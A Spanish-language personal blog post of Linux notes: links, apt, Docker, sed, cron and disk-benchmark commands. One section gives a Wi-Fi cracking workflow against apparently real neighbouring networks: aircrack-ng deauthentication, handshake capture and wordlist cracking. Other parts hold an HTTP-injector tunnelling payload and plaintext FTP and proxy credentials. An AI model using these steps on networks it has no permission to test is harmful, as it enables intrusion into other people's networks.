---
layout: post
title:  "Notas Linux (Rev.)"
date:   2021-08-08 20:46:59 -0300
categories: Sin Categorizar (jekyll update)
---
**Linux Tips (tit)**
=========================

[Actualizar Linux desde la terminal](https://lignux.com/como-actualizar-ubuntu-desde-la-terminal/)  
[Corregir Arbol de Dependencias](https://ubunlog.com/resolver-las-dependencias-de-paquetes/)  
[Descargar Ubunto Desktop](https://ubuntu.com/download/desktop/thank-you?country=AR&version=18.04.3&architecture=amd64)  

 
Crear un direcctorio virtual en base a una ruta especifica

ln -s /home/desauser/terrier-spanish/Users/jorge/scripts/arma_test/person_queries/ pqs_at

 
Algunos enlaces interesantes de linux
~~~
https://www.comoinstalarlinux.com/como-usar-el-editor-nano-linux/
https://www.comoinstalarlinux.com/como-instalar-popcorn-time-en-ubuntu-y-linux-mint/
https://www.comoinstalarlinux.com
https://www.comoinstalarlinux.com/citrix-ica-client-para-linux-ubuntu-y-linux-mint/
https://www.comoinstalarlinux.com/que-hacer-despues-de-instalar-ubuntu-16-04-lts/
https://www.comoinstalarlinux.com/que-hacer-despues-de-instalar-linux-mint-18-sarah/
https://www.comoinstalarlinux.com/tres-semanas-con-linux-mint-18/
https://www.comoinstalarlinux.com/como-instalar-la-nueva-version-de-skype-for-linux/
~~~

 
Como desinstalar LibreOffice en Ubuntu
 
Para eliminar fuentes y otras dependencias de la instalación oficial de LibreOffice en ubuntu:
desinstalar libreoffice normalmente y ejecutar los siguientes comandos:
~~~
sudo apt-get remove --purge libreoffice*
sudo apt-get clean
sudo apt-get autoremove
~~~

Instalar OpenOffice
 
~~~
wget http://sourceforge.net/projects/openofficeorg.mirror/files/4.0.1/binaries/es/Apache_OpenOffice_4.1.6_Linux_x86-64_install-deb_es.tar.gz
cd Descargas 
tar xzvf Apache_OpenOffice_4.1.6_Linux_x86-64_install-deb_es.tar.gz
cd es/DEBS 
sudo dpkg -i *.deb 
Para integrarlo en el menú del linux, y tenerlo disponible en Aplicaciones-Oficina tendremos que hacer lo siguiente. 
Una vez instalado, instalamos los iconos del menu. 
cd desktop-integration 
sudo dpkg -i *.deb 
~~~

 
FTP en mi maquina del trabajo
--

ftp://192.168.137.97:20  
ftp://192.168.137.97  
sudo /etc/init.d/vsftpd restart  

Comparto algunos de los videos de capacitacion que tengo.  
Solo funciona en la red local, desde afuera no se deberia poder acceder  
host: 192.168.137.97  
user: ftpuser  
pass: 123456  

 
**Referencias a comando sed y regex**  
http://www.sromero.org/wiki/linux/aplicaciones/uso_de_sed  
https://likegeeks.com/es/sed-de-linux/ 
https://www.cyberciti.biz/faq/how-to-use-sed-to-find-and-replace-text-in-files-in-linux-unix-shell/
sed ':a;N;$!ba;s/\nResponse: No te entendí./*****/g' UMS_result_191217-0926.txt
reemplazar fin de linea por una cadena determinada.
https://www.iteramos.com/pregunta/1448/sed-como-puedo-reemplazar-un-salto-de-linea-n


[seleccion multi linea en vscode](https://stackoverflow.com/questions/4017278/multi-line-regular-expressions-in-visual-studio)  
[ayuda RegEx Msoft](https://docs.microsoft.com/es-es/visualstudio/ide/using-regular-expressions-in-visual-studio?view=vs-2019)  

**sed y awk**  
https://www.infor.uva.es/~mluisa/talf/docs/labo/L2.pdf  
**Introducción a la manipulación de texto en sistemas basados en UNIX  
https://www.ibm.com/developerworks/ssa/aix/library/au-unixtext/index.html  
Cómo reemplazar varios patrones a la vez, con sed?  
https://rstopup.com/como-reemplazar-varios-patrones-a-la-vez-con-sed.html  
-
sed: unir dos líneas  
http://linux.dokry.com/sed-unir-dos-lneas.html  

Sed en una-línea  
https://jinetedeldragon.wordpress.com/2009/06/22/sed-en-una-linea-sed-one-liners-parte-i/  

OR para seleccion en SED sed '/.*>\|Res.*/!d' temp2.txt

 
cron jobs
 

https://www.redeszone.net/2017/01/09/utilizar-cron-crontab-linux-programar-tareas/  
https://blog.desdelinux.net/cron-crontab-explicados/

para editar el archivo  

	sudo crontab -e

hacer ejecutable el archivo con los comandos a ejecutar  

	chmod ugo+x consulta.sh

carpeta donde guardo los sript a ejecutar con cronjobs  

	/home/desauser/terrier-spanish/Users/jorge/scripts/cron/

~~~
00 10,16,17 * * 1,2 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
20 16,17 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
00 12 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha

35 17 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
40 17 * * * /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
~~~

 
Arranque Linux en modo consola, sin entorno grafico. O deneter entorno grafico
http://haciaelcodigoabierto.blogspot.com/2012/08/desactivar-entorno-grafico-para.html
https://geekland.eu/como-arrancar-en-modo-consola/
https://ubuntuforums.org/showthread.php?t=1879464
https://laguialinux.es/desactivar-inicio-automatico-del-entorno-grafico/
https://www.taringa.net/+linux/como-desactivar-el-entorno-grafico_12nwma
http://vijamaroylinux.blogspot.com/2009/08/cambiar-inicio-automatico-de-ubuntu-sin.html

gestores de inicio de sesión y como cambiar el que usas
https://ubunlog.com/5-gestores-de-inicio-de-sesion-y-como-cambiar-el-que-usas/
https://lignux.com/como-cambiar-los-distintos-tipos-de-escritorios-que-existen-para-todos-los-gustos-en-gnu-linux/
https://geekland.eu/reiniciar-el-entorno-escritorio-linux/


https://ubunlog.com/como-reinstalar-en-entorno-grafico-de-ubuntu-cuando-el-escritorio-no-carga/

 

https://drivemeca.blogspot.com/2016/04/como-instalar-y-configurar-ubuntu.html
 | Como instalar y configurar Ubuntu Server 16.04 LTS paso a paso ~ videoJuegos y Open Source
https://profesorweb.es/2013/01/como-instalar-una-interfaz-grafica-en-ubuntu-server-12-04-lts/
 | Cómo instalar una interfaz gráfica en Ubuntu Server 12.04 LTS - Profesor Web
https://drivemeca.blogspot.com/2015/12/como-instalar-interfaz-grafica-en.html
 | Como instalar interfaz grafica en Ubuntu server paso a paso ~ videoJuegos y Open Source

 
Benchmarks varios en Linux
 
##### Conocer espacio en disco
Para conocer la denominacion de las unidades  
`df -h`  

	dd mide grabacion  
	hsparam mide lectura  
para instalar ioping  
`apt-get install ioping`

 
Midiendo velocidad de lectura

Velocidad teorica  
`sudo hdparm -I /dev/sda | grep -i speed`  
Informe mas detalado  
`sudo hdparm -I /dev/sda`  
Velocidad real del disco  
`sudo hdparm -tT /dev/sda`  
Sin caché de lectura y tres veces seguidas  
`for i in 1 2 3; do sudo hdparm -tT --direct /dev/sda; done`


Midiendo velocidad de grabación
 
`sudo dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync`  
otro comando similar  
`sudo dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync && rm -rf test`  
Otro que da resultados mas bajos  
`sudo dd if=/dev/zero of=/tmp/test.dat bs=512 count=2000000 conv=fdatasync`  
Velocidad de escritura en pendrive
of=nombre del dispositivo  
`sudo dd if=/dev/zero of=/media/javier/MULTISYSTEM/test.dat bs=512 count=2000000 conv=fdatasync`  

	Lo que hace este comando es escribir un datos aleatorios un archivo de 1Gb de tamaño.
	mas de 70mb/s es un valor aceptable  


Midiendo latencia  
`ioping -c 10 .`

	avg menos de 250us sería lo recomendable

--

[Con el comando dd:](https://blog.desdelinux.net/medir-velocidad-de-hdd-con-dd/)  
[Mas detalle del dd](https://www.javierrguez.com/medir-la-velocidad-de-un-disco-duro-con-ubuntu/)  
[Velocidad teorica y real](https://blog.desdelinux.net/medir-rendimiento-de-hdd-hdparm/)  
[Otro con un programa que se debe instalar](https://librematica.es/blogs/comprobar-velocidad-conexion-disco-duro-linux)  
[Medir latencia del disco](https://www.neoguias.com/rendimiento-disco-duro-servidor-linux/)  
[Mejor explicada y con info para probar tambien pendrive](https://geekland.eu/velocidad-lectura-y-escritura-disco/)  
[Test de disco en segundo plano](https://www.redeszone.net/2017/07/22/como-analizar-la-salud-de-nuestro-disco-duro-en-linux/)

 
[Testeo general modular](https://protegermipc.net/2017/05/31/raspberry-pi-benchmark-de-sistema-con-sysbench/)  
`apt-get install sysbench`  

### Prueba de CPU  
`sysbench --test=cpu --cpu-max-prime=20000 run --num-threads=4`  
`sysbench --test=cpu run`  
`sysbench --test=cpu run --num-threads=2`  
donde 20000 es la cantidad a ejecutar y 4 el el nro de cpu a utilizar  

Prueba de Mermoria  
`sysbench --test=memory --memory-block-size=1M --memory-total-size=10G run`  
Si se modifica 1M por 1K suben bastante los tiempos

Prueba de disco  
`sysbench --test=fileio --file-total-size=50G prepare cleanup`   
`sysbench --test=fileio --file-total-size=50G cleanup`   
50G tiene que ser un valor mayor que la memoria ram, para que no se desvirtue el resultado por la cachá de memoria
El segundo comando se ejecuta para que elimine los archivos temporales del test.

 
[Con Entorno grafico similar a AIDA](https://ubunlog.com/como-instalar-y-usar-hardinfo-informacion-exhaustiva-de-tu-pc-con-ubuntu/)  
`sudo apt-get install hardinfo`

 
[Para saber cuantas paradas tiene el disco](http://www.vicente-navarro.com/blog/2007/10/28/linux-no-mata-discos-duros-se-mueren-solos/)  
`smartctl -a /dev/hdc | egrep 'ID|Load_Cycle'`

 
Hacer booteable USB
 
[MultiSystem](https://blog.desdelinux.net/haz-de-tu-usb-una-navaja-suiza-con-multisystem/)  
[Cómo crear un Pendrive multiboot con MultiBootUSB](https://blog.desdelinux.net/crear-pendrive-multiboot-multibootusb/)  
sudo ./install-depot-multisystem.sh

 
[Página de descarga de Visual Studio Code](https://code.visualstudio.com/Download)  

 
**Lunux Apps**
===
Programa para probar web services  
Postman

 
lazygit
 
Pasos para instalar  
`sudo add-apt-repository ppa:lazygit-team/daily`  
`sudo apt update`  
`sudo apt install lazygit`  

 
Instalar android Studio en Linux
 
`sudo snap install android-studio --classic`

 
### scrcpy (Acceso remoto teléfono android sin root)
 
https://elandroidelibre.elespanol.com/2018/04/controlar-tu-smartphone-android-pc-sin-root.html
https://ubunlog.com/scrcpy-ubuntu-controla-android/
https://github.com/Genymobile/scrcpy

 `sudo snap install scrcpy`  

Para ejecutar por cable  
`scrcpy -S -m 640`  

Para configurar adb si fuera necesario para wifi  
`adb tcpip 5555`  
`adb connect 192.168.1.44:5555`  

Para ejecutar por wifi  
`scrcpy -S -b2M -m640`  

Un poquito mas decorados pero no hacen al funcionamiento
scrcpy -S -m1024 --window-title 'My device'
scrcpy -S -m1024 --window-title 'My device' --window-borderless

[Atajos de teclado](https://github.com/Genymobile/scrcpy#shortcuts)
 
### Resetter (Restablecer Linux a su estado original sin formatear)
 
[Resetter](https://ubunlog.com/restablecer-ubuntu-resetter/)  
https://github.com/gaining/Resetter

 
Codecs Varios para Ubuntu  
`sudo apt-get install ubuntu-restricted-extras`  


 
Configurar teclado
 
https://andalinux.wordpress.com/2008/08/08/configurar-teclado-ubuntu-correctamente-en-castellano/

 
Analizamos las shell más populares para la terminal de Linux  
https://hipertextual.com/archivo/2014/09/shell-para-linux/  

 
## OwnCloud (Tipo Dropbox )
Cómo crear tu propia nube con ownCloud paso a paso  
https://hipertextual.com/archivo/2014/10/owncloud/  
Una vez instalado docker
docker pull owncloud
        docker run -d -p 80:80 owncloud:8.1


Cómo tener una nube privada con Ubuntu Server y Nextcloud  
https://ubunlog.com/como-tener-una-nube-privada-con-ubuntu-server-y-nextcloud/  
convierte tu PC vieja en una nube privada personal  
https://hipertextual.com/2018/08/aplicaciones-nube-privada-personal  

 
rclone: Gestionando nuestros servicios de almacenamiento en la nube  
https://www.josedomingo.org/pledin/2019/11/rclone-almacenamiento-nube/

Gestionando nuestro almacenamiento en la nube con nextcloud y rclone
https://www.josedomingo.org/pledin/2019/11/almacenamiento-nube-nextcloud-rclone/


 
La solución cuando Linux no reconoce tu WiFi  
https://johnti.es/2018/03/20/la-solucion-cuando-linux-no-reconoce-tu-wifi/  
Como conectarse a una red WPA en linea de ordenes con nmcli  
https://www.wifi-libre.com/topic-604-como-conectarse-a-una-red-wpa-en-linea-de-ordenes-con-nmcli.html  

 
cambiar fecha y hora desde terminal  
`date --set "2017-10-17 01:16"`  
con un reloj de intentet  
`ntpdate -u hora.roa.es`  

 
Cambiar teclas del teclado (Remapper)  
con xev para conocer como es cada tecla  
 xmodmap -e "keycode 135 = Next"   
 xmodmap -e "keycode 94 = Control_R"   

 
Shell de Linux verifica sintaxis y buenas prácticas(bash y sh).  
https://www.shellcheck.net  

 
## Administrar la memoria virtual en Ubuntu 18.04 LTS  
http://somebooks.es/administrar-la-memoria-virtual-ubuntu-18-04-lts/  
sudo sysctl -w vm.swappiness=10

 
Ajustar la apariencia de Ubuntu 18.04 LTS con Gnome Tweaks  
http://somebooks.es/ajustar-la-apariencia-ubuntu-18-04-lts-gnome-tweaks/

 
Instalar GNOME Shell Extensions en Ubuntu 18.04 LTS  
http://somebooks.es/instalar-gnome-shell-extensions-ubuntu-18-04-lts/

 
Suspender o hibernar Ubuntu 18.04 LTS y Gnome Shell  
http://somebooks.es/suspender-hibernar-ubuntu-18-04-lts/  

 
Cómo hibernar o suspender mediante comandos en la terminal  
https://blog.desdelinux.net/como-hibernar-o-suspender-mediante-comandos-en-la-terminal/  

 
Programas gratis para Linux que no pueden faltar en tu PC (App Grid)  
https://computerhoy.com/noticias/software/programas-gratis-linux-que-no-pueden-faltar-tu-pc-74965  

 
Las mejores apliEntorno gráfico remoto usando open-ssh  
https://linuxparalasmasas.wordpress.com/2007/08/27/6/
caciones y herramientas gratis de 2019 para GNU/Linux  
https://www.xataka.com/basics/mejores-aplicaciones-herramientas-gratis-2019-para-gnu-linux  

 
Controlar la temperatura de nuestro equipo con Psensor en Linux (Psensor)  
https://slimbook.es/tutoriales/linux/297-controlar-la-temperatura-de-nuestro-equipo-con-psensor-en-linux

 
Whatsapp desktop  
`sudo snap install whatsdesk`

 
Docket Basico  
https://www.one-tab.com/page/KY70_eNaSCC73sv05UxfbQ

 
=======
Como establecer una conexion remota SSH  
https://www.adslzone.net/redes/linux/como-establecer-una-conexion-ssh-en-linux/

 
Tunear un servidor SSH  
https://www.redeszone.net/gnu-linux/servidor-ssh-en-ubuntu/

 
Remmina, un cliente de escritorio remoto para Linux  
https://www.redeszone.net/2014/12/20/remmina-un-cliente-de-escritorio-remoto-para-linux/

 
Entornos graficos para Linux  
https://www.vozidea.com/entorno-grafico-escritorio-remoto-ubuntu

 
Lanzar aplicaciones gráficas desde una sesión SSH   
https://www.linuxito.com/gnu-linux/nivel-medio/550-lanzar-aplicaciones-graficas-desde-una-sesion-ssh
Entorno gráfico remoto usando open-ssh  
https://linuxparalasmasas.wordpress.com/2007/08/27/6/

 
Escritorio remoto RDP en Linux  
http://www.estrellateyarde.org/utilidades/escritorio-remoto-rdp-en-linux

 
Montar un Linux Terminal Server, y acceder desde Windows o Linux  
https://www.linux-party.com/35-linux/6935-montar-un-linux-terminal-server-y-acceder-desde-windows-o-linux

 
Conectar con VNC  
http://granada.sourceforge.net/recetas/receta033.html

 
Cómo instalar y configurar XRDP en Ubuntu  
https://clouding.io/kb/como-instalar-y-configurar-xrdp-en-ubuntu/

 
Abrir aplicaciones con interfaz gráfica como usuario root  
https://geekland.eu/abrir-aplicaciones-graficas-como-root/

 
Infraestructura aplicada a la programacion  
Para Plataformar un servidor  
Que es una imagen  
Que es un contenedor  
Cap 31 - Como funciona cuando tienen partes en comun entre imagenes.  
Cap 33 - Puertos  
Cap 37 - Volumenes  
Cap 40 - Variables de entorno  
Cap 45 - Como ingresar a un contenedor  


 
# Docker Referencias rápidas

## buscar una imagen para descargar
`docker search ubuntu`

## descargar una imagen  
`docker pull ubuntu`

## listar imagenes descargadas  
`docker images`

## entrar a una imagen en modo interactivo(run)
`docker run -i -t ubuntu /bin/bash`  

    Esto genera una nuevo contenedor

`docker run --rm --name nombrecontenedor -it ubuntu /bin/bash`

    Este comando ademas de lo anterior lo borra al salir
    En algunos casos puede ser necesario invocar "nombre_imagen:nombre:tag
    Alguno parametros
    --rm Borra el contenedor al salir
    --it modo interactivo
    --name se indica el nombre del contenedor, sino el sistema le asigna uno aleatoriamente.

## salir de un contenedor
`exit`

## listar contenedores disponibles (ps)
`docker ps -a`

## iniciar un contendor (start)
`docker start ubuntu`

    a continuacion debe ir un parámetro, pudiéndose utilizar su identificador (CONTAINDER ID) o su nombre (NAMES).

## detener un contendor
`docker stop`

    a continuacion debe ir un parámetro, pudiéndose utilizar su identificador (CONTAINDER ID) o su nombre (NAMES).

## guardar una nueva imagen
`docker commit ef7e107e0aae ubuntu:14.04`

    Los parámetros son id de contenedor y nombre de la nueva imagen

## como borrar un contenedor
`docker rm ef7e107e0aae`

    El parámetro esta claro que es el id del contenedor

## como borrar una imagen
`docker rmi b72889fa879c`


## ingresar interactivamente a un contenerdor que esta iniciado
`docker container exec -it container-name /bin/bash`

## reiniciar un contenedor
`docker restart Ubuntu-git-config`

    Ubuntu-git-config es el nombre del cotenedor


## Arrancar un contenedor asociando una carpeta real a una carpeta interna del contenedor(volumen)
`docker run --name ubuntu-temp -it -v /home/desauser/Documentos/ws_git:/home/ws_git ubuntu /bin/bash`
    Una vez instanciada la imagen ya queda creado el volumen, que se puede acceder desde otro contenedor.
    el primer parametro es la carpeta fisica, el segundo parametro es la carpeta dentro del contenedor
`docker run --rm --name ubuntu-temp2 -it -v $HOME/Documentos:/home/docs ubuntu /bin/bash`

# Dockerfile
    Generar una nueva imagen a partir de otra con Dockerfile
`docker build --no-cache --pull -t "nombre_imagen:dato_tag" .`



## Falta ver
Dockerfile  
Enlazar 2 contenedores


 
+Tutorial Docker: conceptos básicos y primeros pasos  
  https://www.muylinux.com/2016/04/19/tutorial-docker/
(Estos pasos me funcionaron)

 
Recetas Docker’s  
https://recetas-docker.readthedocs.io/es/latest/index.html

Gestión de volúmenes en contenedores  
https://dockertips.com/volumenes

Volumenes Dockers  
https://javiermartinalonso.github.io/drafts/dockers/2017-10-04-docker-Dockers-volumenes.html

Volúmenes y datos persistentes en Docker  
https://welcomedevelopers.es/docker/volumenes-y-datos-persistentes-en-docker/

Docker for dummies (sonarqube)  
https://www.adictosaltrabajo.com/2015/07/29/docker-for-dummies/ 
docker run -d --name sonarqube -p 9000:9000 sonarqube

Cómo instalar Docker en Ubuntu 18.04  
https://ubunlog.com/como-instalar-docker-en-ubuntu-18-04-y-derivados/

Crear imágenes a medida en Docker con Dockerfile  
https://colaboratorio.net/davidochobits/sysadmin/2018/crear-imagenes-medida-docker-dockerfile/

Gestión del almacenamiento en docker(volúmenes)  
https://www.josedomingo.org/pledin/2016/05/gestion-del-almacenamiento-en-docker/

Cómo crear Contenedores de Docker corriendo en Memcached  
https://www.digitalocean.com/community/tutorials/docker-explicado-como-crear-contenedores-de-docker-corriendo-en-memcached-es

Docker vs Vagrant: diferencias y similitudes  
https://www.campusmvp.es/recursos/post/Docker-vs-Vagrant-diferencias-y-similitudes-y-cuando-usar-cada-uno.aspx

docker - Tips para recordar  
https://dockertips.com/tips-para-recordarque

 
Desplegando owncloud con Docker  
https://hollmanenciso.com/desplegando-owncloud-con-docker/

demo owncloud  
http://demo.owncloud.org/index.php

OwnCloud o cómo crear un servicio de almacenamiento online  
https://raiolanetworks.es/blog/owncloud-o-como-crear-un-servicio-de-almacenamiento-online/



 
#### No suspender al cerrar la tapa en Ubuntu 18.04  
https://pc-solucion.es/2018/08/20/no-suspender-al-cerrar-la-tapa-en-ubuntu-18-04/

 
#### Solución al error de dependencias incumplidas  
https://ubunlog.com/resolver-las-dependencias-de-paquetes/
sudo apt-get autoremove
sudo apt-get autoclean
sudo apt-get update
sudo apt-get -f install

 
#### Pasa saber la ip de mi equipo (como saber mi ip)
hostname -I

Usuario por el cual estoy conectado
whoami

Datos del equipo
hostnamectl




 
SCRIPTS EN BASH
https://www.atareao.es/tutorial/scripts-en-bash/
http://es.tldp.org/COMO-INSFLUG/COMOs/Bash-Prog-Intro-COMO/Bash-Prog-Intro-COMO.html#toc5

 
Muchos paquetes para muchas versiones Lunux.
https://pkgs.org/

 
Gestor de paquetes deb un poco mas sencillo que dpkg
http://manpages.ubuntu.com/manpages/bionic/man1/gdebi.1.html#synopsis

 
Programas para instalar luego de formatear

Resetter
WhatsDesk
Anydesk
Docker
AppGrid
Alarma
Psensor


Estensiones Gnome
 
Clima
Window Corner Preview
FreeMem


Segundo Orden
 
Remmina
Retoques


Config
 
Memoria Swap


Soft de Trabajo
 
Git
Terminator
Double Commander
Sublime text
VScode


 
Ubuntu: Particionamiento recomendado  
http://www.ubuntufacil.com/2014/05/ubuntu-particionamiento-recomendado/  

 
Guía Windows 10 y Ubuntu 18 ¡Aprovecha ambos en el mismo equipo!  
https://www.muycomputer.com/2018/04/29/windows-10-y-ubuntu-18/

 
#### Como conocer en que carpeta esta un ejecutable
 
Con el comando top se conoce el nombre del proceso.  
Con el comando which se conoce el nombre del archivo en disco  
P.ej. which code  

 
### Vagrant, la herramienta para crear entornos de desarrollo reproducibles  
https://www.conasa.es/blog/vagrant-la-herramienta-para-crear-entornos-de-desarrollo-reproducibles/

 
### Aplicaciones para grabar el escritorio en Ubuntu  
https://ubunlog.com/aplicaciones-para-grabar-el-escritorio-en-ubuntu/  

 
### Cómo saber si una tarjeta Ethernet está siendo reconocida en Linux  
https://www.neoguias.com/como-saber-si-tarjeta-ethernet-reconocida-linux/  

 
### WebScraping con Jupyter Notebook
 
sudo docker run --rm -p 8888:8888 jupyter/scipy-notebook:17aba6048f44
http://localhost:8888/?token=35380eef6ef45c76887aa563ae646038d2c93cc60bb1cff6

Primeros pasos con Jupyter Notebook  
https://www.adictosaltrabajo.com/2018/01/18/primeros-pasos-con-jupyter-notebook/  

Otra pagina para Scraping
https://webleonardoscpg.glitch.me/home.html

 
### Borrar archivos recursivamente.
No funciona como en DOS con un parametro /s o algo así.
find . -type f -name '*.o' -delete

### Actualizar una sola aplicaciones desde la linea de comandos
apt-get install firefox --only-upgrade
apt-get install multisystem --only-upgrade

 
### Temas de VPS

#### Script para instalar VPS propio
DANKELTHAHER FREE
https://github.com/DankelthaherManager/ADM-MANAGER-DANKELTHAHER/blob/master/instala.sh
algunas claves que no se si andan
y Configuracion incial una vez instalado script
https://www.youtube.com/watch?v=PisR5ASj4m4

#### Payload
HEAD HTTP/1.1
Host: *.viadeo.com\n


#### Como buscar un host y sacar sus domiños y como validar un host facil y rápido
https://www.youtube.com/watch?v=QQyahYnqhKY&pbjreload=10

#### Como Crear Un Payload Rápido & Conseguir Host Funcionales 💯 |100% Efectivo| como crear payload
https://www.youtube.com/watch?v=tGEkopmdOxw

#### Como crear mi propio servidor http injector (Mega bien explicado) - (LEER DESCRIPCIÓN)
https://www.youtube.com/watch?v=7jo0h4v5nHU
COMO CREAR Y CONFIGURAR UNA VPS PARA HTTP INJECTOR Y OTRAS APPS // VPS GRATIS
https://www.youtube.com/watch?v=R9iR8pqEYqw



### Gestor de red que viene en KDE Plasta en Gnome
nm-connection-editor


### Creackeando una red wifi con linux
https://esgeeks.com/cracking-claves-wifi-con-aircrack-ng/
https://esgeeks.com/formas-de-crear-diccionario-para-fuerza-bruta/


sudo airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
phy2	wlx20e01704b3f0	mt7601u		Ralink Technology, Corp. MT7601U
wlan0mon

 
sudo airmon-ng check kill
Run it as root

 
sudo airmon-ng check 
 
  

sudo airmon-ng start wlan0
sudo airmon-ng start wlan0mon

Killing these processes:

  PID Name
 1306 wpa_supplicant
22800 avahi-daemon
22808 avahi-daemon

 

sudo airodump-ng wlan0mon
sudo airodump-ng wlx20e01704b3f0

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                               
 E8:91:20:DD:1D:7C  -30       14        7    0   2  54e. WPA2 CCMP   PSK  z2                                                                                  
 CC:2D:21:58:82:48  -78       11       57    0   3  54e  WPA2 CCMP   PSK  Tenda_588248                                                                                         
 D8:32:14:51:06:20  -79       12        0    0   7  54e  WPA2 CCMP   PSK  Tenda_510620                                                                                         
 58:D9:D5:1C:FF:F8  -83        9        0    0  11  54e  WPA2 CCMP   PSK  Tenda_1CFFF8                                                                                         
 CC:2D:21:59:6B:D8  -84       13        2    0  10  54e  WPA2 CCMP   PSK  Tenda_596BD8                                                                                         
 50:0F:F5:D5:B5:28  -88        2       18    0   1  54e  WPA2 CCMP   PSK  Tenda_D5B528                                                                                          
 DA:D7:75:62:B0:64  -88        4        0    0  11  54e  OPN              TeleCentro Wifi                                                                                       
 D8:D7:75:62:AF:62  -88        3        0    0  11  54e  WPA2 CCMP   PSK  TeleCentro-af5d     

  
sudo airodump-ng -c 2 --bssid E8:91:20:DD:1D:7C --write MotoE2 wlan0mon
sudo airodump-ng -c 2 --bssid E8:91:20:DD:1D:7C --write MotoE2 wlx20e01704b3f0

sudo airodump-ng -c 11 --bssid D8:D7:75:62:AF:62 --write TeleAFD5 wlx20e01704b3f0
sudo airodump-ng -c 5 --bssid D8:32:14:50:91:50 --write Tenda_509150 wlx20e01704b3f0
sudo airodump-ng -c 3 --bssid CC:2D:21:58:82:48 --write Tenda_588248 wlx20e01704b3f0

 
aireplay-ng -0 10 –a 02:08:22:7E:B7:6F  -e EsGeeks wlan0mon
sudo aireplay-ng -0 10 -a E8:91:20:DD:1D:7C -e z2 wlan0mon
sudo aireplay-ng -0 10 -a E8:91:20:DD:1D:7C -e z2 wlx20e01704b3f0
sudo aireplay-ng -0 10 -a CC:2D:21:58:82:48 -e z2 wlx20e01704b3f0

 

aircrack-ng EsGeeks-01.cap -w rockyou.txt
sudo aircrack-ng MotoE2-01.cap -w 
sudo aircrack-ng Tenda_588248-01.cap -w aaa.txt

 

crunch 8 8 qwertyui –o dic.txt
crunch 4 4 -f char.lst lalpha -o 05.txt


### udemy-dl: Descargar cursos de Udemy para uso personal
https://esgeeks.com/descargar-videos-cursos-udemy/

como usar las cookies
https://github.com/r0oth3x49/udemy-dl/issues/389#issuecomment-491903900

cd $HOME/Descargas/capacitacion/udemy-dl-master/
Tener en cuenta que por default no queda en el path, asi que hay que ir a la carpeta donde esté el archivo .py
Si se ingresa usu:pass a mano suele dar error, lo mejor es invocar a la cookie haya descargado el navegador.
  Las indicacines están en el archivo readme.
  Se debre crear un archivo e invocarlo con el parámetro -k
  El contenido del archivo txt es solo:
  access_token=<valor_de_cookie>

sintaxis básica.
python udemy-dl.py https://www.udemy.com/course/curso-basico-de-django-paginas-web-con-python/ -k cookie.txt


### Instalar MegaSync
https://nksistemas.com/megasync-para-linux-te-mostramos-como-hacer-la-instalacion/


### Buscar e Instalar desde paquetes snap
https://snapcraft.io/


### Como ver la pantalla del telefono android en la pc
Se hace con un programa java llamado:
http://droid-at-screen.org/
-Se descarga el archivo jar 
  y se ejecuta: 
  java -jar droidAtScreen-a.b.c.jar
Si pide la ruta del comando externo ADB
Consultar con 
which adb
Suele ser la ruta:
/usr/bin/adb

wget https://bintray.com/artifact/download/ribomation/maven/droidAtScreen-1.2.jar
wget https://bintray.com/artifact/download/ribomation/maven/droidAtScreen-1.1.jar

Nota: es necesario tener habilitado depuracion usb dentro de modo desarrolador


### Instalar openboard con snap
sudo snap install openboard
https://openboard.ch/download.en.html
Si no se instala con snap, seguir los pasos que estan en el siguiente enlace de gitlab.
https://gitlab.com/simbd/Scripts_Ubuntu/raw/master/Openboard_1804.sh?__cf_chl_captcha_tk__=83730dc89cea5ca5c3790d72ecb3eb72449a97d2-1585794291-0-AVCNl4ypqgQIBla0Ajs0izefIWki-Vicu1FTPqYbNO-AcwSPxFPI2tkdtb-6mWionkr4LYX_hAGbdeQP04Gr_qAwKvMRniSEeGesmReJ8ABfbxji_hR0BMHau8p36F4YEb4JIIbmr6_8HEcLpCwFrkOX3xIEORv6kES6YAdu7X6J0LNp81Fum2q_RIprufJjvuSfcToQGEirzH1QjURie2ragTXA8jPDd9iQR2MHa5e4mNqUjs5SlFxHV1-mf4Yz0quRDvhmi_UYiqWyHpgdgqYXJnG3luGcLooQMbdbjGt2jlO9NP6mAx_dNtHW2h0IcxTrX90aevOYfxJl4zalJZYffU6Yf8LzTfSy5Vy__zZEjFJMnRIuamu_T0j3KeIJ_oW3Te7obypOlffiSfKCSbdMg0X-KnHOfMs5Omuhp8KXIdhVrTi6SbVyKlHcpIW1JUaXyCwI6wraKg2O9XsiVrCFnbf2qPFODwxNtrxsgdCk31N1bY2c_HlUPqtw7VQ2cjDhi1hivj-GDQUDy8F2G9vjnWQ-DePMIpFYvIoQokzxn6vzndE4f4WxrpjVYsqn-Q


### Como saber que placa wifi esta instalada, con un solo comando
lspci | grep Wireless


### Como usar Linux Screen
Para crear sesiones virtuales y recuperarlas luego.
Sobretodo para sesiones en servidor.
Como nunca se apagan, nuestra sesion quedará como en pausa para la proxima vez, aunque se corte la conexión.
https://www.hostinger.es/tutoriales/instalar-usar-linux-screen/
screen a secas para iniciar.
para darle un nombre a la sesion
screen -S aaa
listar las sesiones
screen -ls
para restaurar la sesion virtual, sea por numero de sesio/proceso o por nombre de sesion.
screen -r aaa
screen -r 13031.pts-0.vps-1771262-x
dejar sesion en ejecucion
Ctrl + d

### Cosas de Proxy en Linux

#### Ubuntu - Configurar autenticación de proxy en la consola

Para verificar las variables de entorno
env | grep proxy
tambien 
printenv | grep proxy

Cree el archivo de configuración dentro del directorio /etc/profile.d.
sudo nano /etc/profile.d/proxy.conf

Aquí está el contenido del archivo:
export http_proxy=http://gohan:mypass123@192.168.0.10:3128
export http_proxy=http://192.168.43.1:44355

En nuestro ejemplo, Ubuntu utilizará el servidor proxy 192.168.0.10 y su puerto 3128.
En nuestro ejemplo, Ubuntu usará el usename gohan y la contraseña mypass123 para autenticarse.

